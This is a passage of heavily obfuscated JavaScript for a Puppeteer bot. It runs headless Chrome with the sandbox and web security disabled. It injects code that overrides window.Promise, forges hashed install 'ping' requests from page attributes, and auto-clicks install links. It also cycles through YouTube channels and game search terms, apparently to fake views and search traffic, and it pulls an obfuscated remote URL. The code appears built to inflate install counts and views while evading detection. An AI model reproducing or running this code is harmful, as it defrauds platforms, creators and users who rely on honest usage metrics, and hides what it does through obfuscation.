-0x5, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x6 * 0x5fc + -0x172b + -0x1 * -0x3b23; J < 0x5d1 * -0x3 + -0x434 + 0x15f7; ++J)
                K = Q[J - (-0x964 * -0x2 + 0xba * -0x1f + 0x3c1)] ^ Q[J - (-0x1465 * 0x1 + -0x1b75 + 0x2a9 * 0x12)] ^ Q[J - (-0x1011 + 0x1 * -0x6de + 0x16fd)] ^ Q[J - (-0x2564 + 0x1b44 * 0x1 + -0x10 * -0xa3)], Q[J] = K << 0x140b * -0x1 + -0x17b * 0xb + -0x47 * -0x83 | K >>> 0x5 * -0x55c + -0x2fa * -0x9 + 0x21;
              for (J = 0x1ced + -0x739 * 0x2 + -0xe7b; J < -0x15b7 + 0x1 * 0xadb + -0x32 * -0x38; J += 0xb64 + -0x24ad + -0x1 * -0x194e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1f * 0x6e + 0x1feb + -0x2d38 | L >>> 0x1 * 0x248c + -0x1 * 0x50f + -0x1f62) + (M & N | ~M & O) + P + (0xd76edb7 * 0x6 + 0x15ee388e + -0xc35513f) + Q[J] << -0x126f * 0x1 + -0x1287 + -0x6 * -0x629) << -0x1bf1 * -0x1 + -0x8b6 + 0x99b * -0x2 | P >>> 0x1 * -0x1fa2 + 0x1c42 + 0x51 * 0xb) + (L & (M = M << 0x1596 + -0xff * -0x1 + 0x9 * -0x27f | M >>> -0x1 * -0x131b + 0x5 * -0x2b9 + -0x57c) | ~L & N) + O + (-0x1e5caa * -0x527 + 0x3365798c + -0x75526fd9) + Q[J + (-0x1 * -0x239a + 0x1 * -0x23cd + -0x34 * -0x1)] << 0xf * -0x8e + -0x3dc + 0xc2e) << -0xa9 * -0x3b + -0x4 * 0x6a1 + -0xc6a | O >>> 0x4 * -0x649 + 0x482 * 0x1 + -0x14bd * -0x1) + (P & (L = L << 0x5a3 + 0xb0 * -0x13 + 0x1 * 0x78b | L >>> -0x62d + 0x99d + -0x36e) | ~P & M) + N + (-0x1 * 0x40b8bd5f + -0x8a463387 + 0x125816a7f) + Q[J + (0xc * -0x11a + -0x1 * -0x9c1 + 0x7 * 0x7f)] << 0x1 * 0xf07 + 0x1 * 0x12dd + -0x21e4) << 0x1dd7 * -0x1 + -0xd33 + 0x97 * 0x49 | N >>> -0x2469 + 0x10c3 + -0x1 * -0x13c1) + (O & (P = P << 0xd40 + -0x23c6 + 0x16a4 | P >>> 0x453 * -0x6 + 0x11 * -0x1c8 + 0x4 * 0xe0f) | ~O & L) + M + (-0x22 * 0x2ababe7 + 0x154d17e1 * 0x1 + 0xa0023666) + Q[J + (-0x6df * -0x3 + 0xbe3 + -0x207d)] << -0xd64 + 0xaa * -0x10 + 0x601 * 0x4) << 0x134d + -0xe * 0x197 + 0x2fa | M >>> 0x815 + 0x1 * 0x52f + -0xd29) + (N & (O = O << -0x2563 + -0x1f93 + 0x1145 * 0x4 | O >>> -0x21f5 + -0x126 * -0x19 + 0x541) | ~N & P) + L + (0x1c71287 * 0x47 + 0x203dd633 * -0x1 + -0x375d3a5) + Q[J + (0x1 * -0x8bb + -0xeff + 0x17be)] << 0x2 * 0x617 + -0x1cbc + 0x108e, N = N << 0xa5f + 0x796 * -0x3 + 0xc81 | N >>> 0x21c2 + 0xab + -0x63 * 0x59;
              for (; J < -0x1 * -0x1149 + 0xc44 + -0x1d65; J += 0x6 * 0x10a + -0x5b * 0x13 + 0x8a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xc9 * 0x29 + 0x2e * 0x3b + 0x159c | L >>> 0xd62 + -0x183e + -0x191 * -0x7) + (M ^ N ^ O) + P + (0x7274801 * 0x5 + -0x7e193d56 + 0xc92ec0f2) + Q[J] << -0x792 + -0xc * -0x191 + -0xb3a) << -0x2125 + -0x2691 + 0x47bb * 0x1 | P >>> -0x96 + -0x287 * 0x1 + 0x4 * 0xce) + (L ^ (M = M << -0x1d7 * 0x9 + 0x4df * 0x4 + -0x2cf | M >>> 0x1ad0 + -0xb * 0x2b1 + 0x2cd) ^ N) + O + (-0xa873777f + 0xdbe937ab + 0x1 * 0x3b642b75) + Q[J + (-0x76d + -0x32b * -0xc + -0x1e96)] << 0x1dc6 + -0x20 * -0x89 + -0x2ee6) << 0x2 * 0xb55 + -0x715 * -0x2 + -0x24cf | O >>> -0xcd9 * 0x2 + -0x35e * -0x9 + 0x1 * -0x481) + (P ^ (L = L << -0x4c * -0x1b + -0x691 + -0x155 | L >>> -0x2 * 0x99b + 0xe7 * 0xd + 0x77d) ^ M) + N + (-0x55bf9c56 + 0x7f8bfc9b + 0x450d8b5c) + Q[J + (-0x1f3 * 0xa + 0x589 * -0x6 + 0x34b6)] << -0x1ac7 + 0x29f * 0x7 + 0x53 * 0x1a) << -0x35f * -0x8 + -0x17 * -0xa9 + -0x2a22 | N >>> 0x1417 + 0x22d9 + -0x1 * 0x36d5) + (O ^ (P = P << 0x2218 + -0x1251 + 0xfa9 * -0x1 | P >>> 0x15bc + -0x870 + -0xd4a) ^ L) + M + (0x2149 * 0x19801 + -0x8 * 0x8198b77 + 0x7a99ce10) + Q[J + (0x1b88 + -0x1 * -0x232f + 0x4 * -0xfad)] << 0x2 * 0x925 + -0x115b + 0x1 * -0xef) << 0x865 + 0x7a2 + -0x1002 | M >>> 0x7d1 * -0x1 + 0x3 * -0xb6c + 0x2a30) + (N ^ (O = O << -0x114 * 0x5 + -0x2546 + 0x1564 * 0x2 | O >>> 0xdab * 0x1 + 0x3b5 + -0x39 * 0x4e) ^ P) + L + (0xcb * -0x769e2d + 0xb1d * 0x8911f + 0x679 * 0x10f2f5) + Q[J + (-0x1 * 0x1f67 + 0x1 * -0x2662 + -0xa7 * -0x6b)] << 0x1 * -0x613 + -0x1 * 0x131e + 0x1931 * 0x1, N = N << 0x7 * 0x3cb + -0x3e9 + -0xb43 * 0x2 | N >>> 0x6b * 0x5 + 0xd0b * -0x1 + 0xaf6;
              for (; J < -0x2400 + 0xc89 * 0x1 + -0x17b3 * -0x1; J += 0xa3 + 0x4 * 0x4cc + -0x34d * 0x6)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2bb * -0x3 + 0x1 * 0x20f8 + -0x2924 | L >>> 0x1a7 * 0xd + -0x1301 + -0x25f) + (M & N | M & O | N & O) + P - (-0xae7980f4 + 0x6 * 0x192ff4b9 + 0x883e07c2) + Q[J] << -0xb3 * 0x9 + -0x1157 + 0x17a2) << 0x2c0 + -0x31d * 0x1 + -0x1 * -0x62 | P >>> 0x1 * 0xafc + 0xeac + -0x198d) + (L & (M = M << -0x2a * 0x85 + 0x1f * 0x67 + 0x977 | M >>> -0x2667 + -0x8cc * 0x3 + 0x40cd) | L & N | M & N) + O - (-0xdcde6fd9 + 0xc11721f7 + 0x2 * 0x4655c883) + Q[J + (0x1 * -0x727 + -0x15e2 + 0x1d0a)] << 0x1267 + 0x27 * -0x41 + -0x880) << -0x1 * -0xbff + -0x2f * -0xbf + -0x2f0b | O >>> -0x55f + 0x997 + -0x41d) + (P & (L = L << 0xf7d * -0x1 + 0x4d8 + -0x227 * -0x5 | L >>> 0xfa * -0x23 + 0x2322 + -0xf2) | P & M | L & M) + N - (0x8b449aeb + 0x2 * -0x4ff8105d + 0x858fc8f3) + Q[J + (0xa4c + -0x2 * 0xb8d + 0xcd0)] << 0x251c + -0x1e59 + -0x6c3) << 0x25b6 + -0x16e + -0x2443 | N >>> -0x1f22 + 0x1485 + 0xab8) + (O & (P = P << -0xb * -0x335 + 0x12f + -0x2458 | P >>> -0xd0 * -0x8 + 0xb2a * -0x3 + 0x60 * 0x48) | O & L | P & L) + M - (-0x88a7acc9 + -0x100c * -0x247d + 0xf7426a11) + Q[J + (0x1 * 0x1f71 + 0x77c * -0x4 + -0x17e)] << -0x1b96 + -0x17 * -0x9e + 0xd64) << -0x66b * -0x1 + -0x1 * 0x1811 + 0x11ab | M >>> 0x132c + 0x6fd * 0x5 + -0x3602) + (N & (O = O << -0x3 * -0x233 + 0x1d * -0x116 + 0x1903 | O >>> -0xa6d * -0x3 + 0x110a + -0x304f) | N & P | O & P) + L - (-0x15ce2e2c + 0x73bd2d46 + 0x97aa205 * 0x2) + Q[J + (-0x7c1 * -0x1 + -0x103a * 0x1 + -0x35 * -0x29)] << 0x77 * 0xe + 0x64 * 0x11 + 0x132 * -0xb, N = N << -0xf81 + 0x86b + 0x734 | N >>> 0x1359 + 0x3 * -0xbdd + 0x5 * 0x340;
              for (; J < -0x23f9 + 0x1 * 0x11f2 + 0x1257; J += -0x2575 * 0x1 + 0xa37 + -0x3e5 * -0x7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x3b * -0x3d + 0xb61 * -0x3 + 0x3037 | L >>> -0x41 * -0x1 + -0x1566 + 0x1540) + (M ^ N ^ O) + P - (-0x1 * 0x27cee9 + -0x4c106d85 + -0xb * -0xbcd96c8) + Q[J] << 0x2 * 0x9c7 + 0xf5c + -0x22ea) << 0x205f + 0x9d9 + -0x3 * 0xe11 | P >>> 0x1d30 + 0x243a + 0x15c5 * -0x3) + (L ^ (M = M << 0x63 + 0x353 * 0x1 + 0xa * -0x5c | M >>> 0xcf * -0x2c + -0x1 * -0xcff + 0x1697) ^ N) + O - (-0x2d0e26d6 + -0x53398fff + 0xa81ac3 * 0x115) + Q[J + (0x20f4 + -0x295 * -0x7 + -0x3306)] << 0x14d8 + -0x1769 + 0x49 * 0x9) << 0x1073 + 0xbf1 + -0x9 * 0x327 | O >>> -0x23f5 + 0x2002 + 0x6 * 0xad) + (P ^ (L = L << -0x1dff + 0x3b * -0x12 + -0x7 * -0x4e5 | L >>> 0x1565 + -0x4c * 0x47 + 0x1 * -0x4f) ^ M) + N - (0x1 * 0x4b5038f7 + 0xef * 0x5eae2b + -0x1 * 0x6e1794f2) + Q[J + (-0x7 * -0x205 + 0x2e0 + -0x1101 * 0x1)] << -0x11d0 + 0x10f1 * 0x2 + -0x1012) << -0x1e36 + -0xa * -0x26b + 0x60d | N >>> 0x50 * -0x16 + 0x1a6 + 0x555) + (O ^ (P = P << 0x232f + 0x34 * 0x9d + -0x42f5 | P >>> -0x1028 + 0x1 * 0xbb1 + -0x1 * -0x479) ^ L) + M - (-0x2d62169d * 0x2 + -0x36ab70f2 + -0x143477 * -0x9da) + Q[J + (0x11 * -0x1fb + -0x109f * 0x1 + 0x324d)] << -0x1d7a + 0x1d7b + 0x1 * -0x1) << 0x1 * 0x1f5f + 0x939 + -0x2893 | M >>> 0x3 * -0x394 + -0x252 + -0x463 * -0x3) + (N ^ (O = O << -0xb6 * 0x1f + -0x1dfc + 0x3424 | O >>> -0x792 + -0x8f9 * -0x2 + -0xa5e) ^ P) + L - (0x81b23d0 + -0x3e748541 + 0x6bf69f9b) + Q[J + (-0x203 * -0x8 + 0x9d0 * 0x1 + 0x4 * -0x679)] << 0x20fc + -0xde3 * -0x2 + -0x3cc2, N = N << -0x1 * 0x13c7 + 0x1 * -0x1530 + -0xd * -0x329 | N >>> 0x2364 + -0xdff * -0x1 + -0x1 * 0x3161;
              this['h0'] = this['h0'] + L << -0x99f + 0x46e + -0x1 * -0x531, this['h1'] = this['h1'] + M << -0xa1e + 0x17c * 0x13 + 0x5 * -0x39e, this['h2'] = this['h2'] + N << -0x4a0 + -0x242b + 0x28cb, this['h3'] = this['h3'] + O << 0xef7 + -0x1d49 + -0x4e * -0x2f, this['h4'] = this['h4'] + P << 0x1 * -0xb29 + 0xeb1 * 0x1 + -0x388;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x6 * 0x445 + 0x2 * -0x846 + -0x8f6 & -0x201 + -0x1b32 + 0x1d42] + w[J >> 0x772 + 0x2387 + 0x3 * -0xe4b & -0x49 * 0x83 + -0xa * 0x26b + -0x9 * -0x6d8] + w[J >> 0x2273 + 0x5 * -0x63d + -0x32e & -0x1 * -0xbe6 + 0xf53 * -0x2 + -0x3c3 * -0x5] + w[J >> -0x1 * 0xfb5 + 0x23e4 + -0x1 * 0x141f & 0x6cf + 0x8 * 0x497 + -0x2b78] + w[J >> 0x92f + 0x13c5 + 0xb9 * -0x28 & -0x305 * 0x2 + 0x18e8 + -0x3 * 0x645] + w[J >> -0x21d * -0x2 + -0xd * 0x1b + -0x3 * 0xf1 & -0x3a * 0x56 + 0xfad + 0x3de] + w[J >> 0xac7 + 0x383 * -0x7 + 0xdd2 & 0x224 * 0xb + 0x18b9 + 0x2 * -0x181b] + w[0x4d * 0x43 + -0x1c01 + 0x2d * 0x2d & J] + w[K >> 0x26ea + 0x11ab + 0xb7 * -0x4f & 0x1563 + -0x12d7 + -0xd * 0x31] + w[K >> 0x1 * -0x92e + 0xca * -0x4 + 0xc6e & -0x934 + 0x1 * 0x98f + 0x4c * -0x1] + w[K >> 0x1 * -0x1891 + 0x10a7 + 0x7fe & 0x1b2b * -0x1 + 0x1 * 0x1558 + 0x6 * 0xfb] + w[K >> 0x3f2 + 0x21ac * -0x1 + 0x1f * 0xf6 & 0xfe9 + 0x2 * -0x548 + -0x54a] + w[K >> -0x1c26 + -0x1 * 0x2039 + 0x3c6b & 0x21 * -0xde + 0xb * 0x108 + -0x1155 * -0x1] + w[K >> -0xcf * 0x13 + 0x3 * -0x50b + 0x1e86 & 0x1 * 0xe43 + 0x3a5 * -0x9 + 0x45 * 0x45] + w[K >> 0xeaf + -0x20f + 0xc * -0x10d & 0x423 + -0x1b0f + -0x9f * -0x25] + w[-0x247c + -0x68b + -0x158b * -0x2 & K] + w[L >> 0x1a * 0x9e + 0x9 * -0x47 + -0xd71 & -0x1 * 0x1eb7 + 0x1194 + 0xd32] + w[L >> -0x2cb + -0x5bb + 0x89e & 0xe2 * 0x10 + 0x574 + 0x1385 * -0x1] + w[L >> 0xfc9 + 0xdcc * -0x1 + 0x3 * -0xa3 & 0x8ae + 0x97a + 0x1219 * -0x1] + w[L >> 0xf9 * 0x1 + -0x132b * -0x1 + 0x1414 * -0x1 & -0xd40 + -0x1 * 0xc47 + 0x1996] + w[L >> -0x1570 + -0x303 * -0x7 + -0x1 * -0x67 & 0x5 * 0x19b + 0x19fa + -0x21f2] + w[L >> -0x7 * 0x41 + -0x2285 + 0x26c * 0xf & -0x23 * -0x25 + -0x245c + -0xc * -0x29d] + w[L >> 0xef + -0x3e1 * 0x9 + 0x21fe & 0xcf7 + 0x1afd + -0x27e5] + w[-0xce9 * 0x1 + -0x1bc * 0x2 + 0x1070 & L] + w[M >> -0xe5 + -0x2 * -0x5dd + -0xab9 & -0x9 * -0x391 + -0x17a * 0x4 + -0x1a22] + w[M >> -0x3 * 0x62 + 0x9dc + -0x89e & -0x75 * -0x12 + -0x1 * -0x1e89 + -0x26b4] + w[M >> -0xbcc + -0x1 * -0x1eab + -0x12cb & 0xe2 * -0x1a + -0x14cc + 0x5 * 0x8c3] + w[M >> -0xdc8 + -0x2411 + 0x31e9 & -0x817 * 0x3 + 0x1d * -0xf3 + 0x33db] + w[M >> -0x1 * 0xcf1 + -0x4 * -0x46f + -0x4bf & 0x8b4 + -0x1 * 0x537 + -0x36e] + w[M >> -0x1d * 0x43 + -0x12eb + 0x1 * 0x1a8a & 0x2463 + -0x2530 + 0xdc] + w[M >> 0x1b48 + 0x1 * 0x29 + 0x7 * -0x3eb & 0x261c + -0x105d + 0x15b0 * -0x1] + w[0x84c + -0x708 * 0x1 + -0x135 & M] + w[N >> 0x198 * -0x1 + -0x24d2 + -0x2686 * -0x1 & -0x83 + 0x14f * -0x1 + 0xd * 0x25] + w[N >> 0x1be2 + -0x2 * 0x221 + -0x1788 & -0x1a * 0x50 + 0xfd3 * -0x1 + 0x1802] + w[N >> 0x8 * -0x188 + -0x4 * -0x1f2 + 0x1 * 0x48c & -0x14ea + 0x3f * -0x10 + 0x1 * 0x18e9] + w[N >> -0xe34 + 0xca5 + 0x53 * 0x5 & 0x1b1e + -0x1 * 0xff5 + 0x58d * -0x2] + w[N >> -0x608 + 0x1bab + -0x1597 & -0x11dd + 0xb7a + -0x672 * -0x1] + w[N >> -0x115b + -0x252b + 0x1b47 * 0x2 & 0x735 + -0xcc8 * -0x2 + -0x20b6] + w[N >> -0xada + 0x1 * -0xaef + -0x1 * -0x15cd & -0x1588 + 0x1ee7 + -0x950] + w[-0x2660 + 0xc7b + 0x16 * 0x12e & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x21c8 + -0x24ef + 0x46cf * 0x1 & 0x235 * -0x10 + -0xaad + 0x2efc,
                J >> -0x10ab + 0x246 + 0xe75 & 0x13a2 + -0x261f + 0x137c,
                J >> 0x195 * 0x16 + 0x9ac + -0x2 * 0x1639 & 0x14d * -0xd + -0xaca + 0x1cb2,
                0x1 * 0x997 + -0x23ac + 0x1b14 & J,
                K >> -0x1f1c + -0x22b1 + 0x41e5 & -0xd * -0x29f + 0x4 * 0x3e4 + -0x30a4,
                K >> 0x18a6 * 0x1 + -0x1 * 0x83 + -0x1813 & -0x17eb + -0x7d6 + 0x20c0,
                K >> -0x11fa + -0x93b + 0x13 * 0x16f & -0x1 * 0x879 + -0x2449 + -0xdd * -0x35,
                0x1b9a + -0x2f * -0x2f + 0x70c * -0x5 & K,
                L >> 0x1 * 0x13e8 + 0xba5 + -0x1f75 & 0x1 * 0xba + -0x1d82 + 0x1dc7,
                L >> -0x1b8e * -0x1 + 0x1 * -0x13ed + 0x1 * -0x791 & 0x763 + -0x13 * 0xed + -0x3d * -0x2f,
                L >> 0x3d7 * 0x7 + 0x1f27 + -0x3a00 & -0xe76 + -0xdbb + 0x1d30,
                -0x1277 * -0x1 + 0x1878 + -0x29f0 & L,
                M >> -0x1d20 + -0x1533 + 0x1 * 0x326b & 0x1cae + -0x12e9 + -0x8c6,
                M >> 0x23ce + -0x49 * 0x26 + -0x18e8 & -0x1d70 + -0x174 + -0x3 * -0xaa1,
                M >> -0x2 * -0xf94 + 0x6 * -0x241 + -0x5de * 0x3 & 0x9a8 + 0xe7d + -0x1726,
                -0x1 * 0x162 + 0x265a * 0x1 + -0x23f9 & M,
                N >> 0x834 + -0x1 * 0x1fde + 0x17c2 & 0x25b5 + -0x23f * 0xd + -0x281 * 0x3,
                N >> 0x117e + 0x205a + -0x31c8 & -0x2e3 + 0x419 * -0x4 + 0x1446,
                N >> -0x6f5 * 0x3 + -0x772 * -0x2 + 0x603 & 0x557 * -0x1 + 0xe9d + 0x847 * -0x1,
                0x15d * 0x12 + -0x47c * 0x3 + -0xa17 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x216 + -0x1 * -0x17ff + -0x15d5), (K = new DataView(J))['setUint32'](0x1772 + -0x17fd + -0x8b * -0x1, this['h0']), K['setUint32'](0xdbc + -0x72e + -0x68a, this['h1']), K['setUint32'](-0x13e9 + 0x301 + 0x10f0, this['h2']), K['setUint32'](0x241f + -0x1b28 + -0x8eb, this['h3']), K['setUint32'](-0x1c4d + 0x2 * 0xdbd + -0x1 * -0xe3, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0xaf * 0x17 + -0x17f3 + 0x83a];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x246f + -0xcb * 0x31 + 0x5 * 0x7c;
            J[-0x3 * -0x593 + -0x18d9 * 0x1 + 0x820]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0xa40 + 0x1 * -0x21c1 + 0x2c01] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x3 * -0x7c9 + 0x1001 + 0x5 * -0x7df), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1 * -0x512 + -0x834 + 0xd47;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x2517 + 0x2460 + -0x439b), Promise['resolve'](-0x30a + 0x2ab * 0x2 + -0x24b);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x111 * 0x1f + -0x2 * 0xf17 + -0x1 * -0x3f3d; j < -0x6 * -0x6b + -0xbe2 + 0x961; j++)
    i();
}
const NETWORK_PATIENCE = -0x2c3 * 0x1 + -0x19c3 + 0x1 * 0x3bc6 + (-0x1b5 * -0x8 + 0x5d * 0x47 + 0x1 * -0x1bbb) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1 * -0xec0 + 0x1 * -0x925 + 0x198 * 0xf) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function a() {
  const bl = [
    'v8kQgCo4DdZdJ8khfSkJ',
    'k8kFi8o1sxtcVe8wW4O',
    'aytHiLe0s6',
    'WRpdK8k0WR8CAehcNar3',
    'D1zUs0DtALKZAq',
    'lsvfnYvcrcu5mq',
    'B2CUyML0C3jJlG',
    'l3nJCMLWDhmV',
    'd2f2CIW',
    'https://gr',
    '-L583IZF6s',
    'WODmFGejWROQfSkAWPi',
    '37.36\x20(KHT',
    's2L0lZuZnY4ZnG',
    'f8kbWR7cScWvxgr/W4K',
    'nSo2vKdcR2NcPdtcLdK',
    'c8kNW7dcKSk1FG',
    'b6gOcEwtZ8',
    '44geioAxPEACRoIQNUwTL+w5LsXIDa',
    'L1Oy5F6ZMO',
    'pvddQmkMxmo/qCokjwS',
    'Ahr0Chm6lY9NCG',
    'WOiVW5CTaCkjW7q6rZ0',
    'mattcodes0',
    'W7GCWRtdR8kfm1FdIf8',
    'slice',
    '7/wp.js'
  ];
  a = function() {
    return bl;
  };
  return a();
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x10d * -0x3 + 0x2 * -0x527 + 0xd75);
    let h = e[f];
    if (b['ggbMkJ'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1 * 0x1a30 + -0x2323 + 0x3d53, s, t, u = 0x9c6 + -0x1c15 + 0x124f; t = n['charAt'](u++); ~t && (s = r % (0x3 * 0xc25 + -0x160a + -0xe61) ? s * (-0x785 + -0xb4b * -0x3 + -0x3 * 0x8b4) + t : t, r++ % (0x1a05 + 0x9a3 * -0x2 + -0x1 * 0x6bb)) ? p += String['fromCharCode'](0x2148 + 0x1 * -0x367 + -0x1ce2 & s >> (-(-0xb * 0x159 + -0x6a3 * -0x4 + -0xbb7) * r & 0xd64 + -0x17 * -0x3 + -0xda3)) : 0x474 * -0x7 + -0x1d * -0xdb + 0x65d) {
          t = o['indexOf'](t);
        }
        for (let v = 0x7 * -0x1eb + -0x78d + 0x14fa, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1c08 + 0x1c29 + -0x3821))['slice'](-(0x5e * -0x43 + 0x16d9 + 0x1 * 0x1c3));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x293 * -0xb + -0x3 * 0xaea + 0x3d0f,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x18aa + 0x1 * 0x14e7 + -0x3c3 * -0x1; u < -0xfe0 + -0x8d9 + 0x19b9; u++) {
          p[u] = u;
        }
        for (u = 0xe33 + 0x479 * -0x7 + 0x16d * 0xc; u < 0x18a * -0x11 + -0x1 * -0x21eb + -0x6c1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1efa + -0x51 * -0x3e + -0x3198), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1a7a + 0x3 * 0x9c8 + 0x16f * -0x2, q = 0x1078 + -0x1 * -0x14ce + 0xd * -0x2de;
        for (let v = 0x3 * -0x68c + -0x202a + 0x33ce; v < n['length']; v++) {
          u = (u + (-0xbcb * 0x1 + 0x11f * -0x1d + -0x3 * -0xec5)) % (-0x3f3 * 0x4 + 0x93b * -0x1 + 0x1a07), q = (q + p[u]) % (0x204 * -0xf + -0x23f0 + 0x432c), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1abf + 0x1 * 0x18c7 + -0x2 * -0x17c)]);
        }
        return t;
      };
      b['eEAWoa'] = m, c = arguments, b['ggbMkJ'] = !![];
    }
    const j = e[-0x1785 + -0xedd + 0x2662],
      k = f + j,
      l = c[k];
    return !l ? (b['TVUbSh'] === undefined && (b['TVUbSh'] = !![]), h = b['eEAWoa'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x26da * 0x1 + 0x5 * 0x17b + -0x1 * -0x1f73; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + 